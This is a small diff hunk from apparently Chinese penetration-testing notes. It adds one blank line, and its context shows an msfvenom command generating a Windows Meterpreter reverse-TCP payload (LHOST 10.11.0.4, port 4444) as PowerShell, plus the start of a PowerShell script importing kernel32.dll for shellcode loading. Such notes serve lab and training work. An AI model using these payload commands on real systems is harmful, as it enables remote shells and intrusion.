@@ -165,6 +165,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powers
 ```
 
 2. ps脚本
+
 ```
 $code = '
 [DllImport("kernel32.dll")]
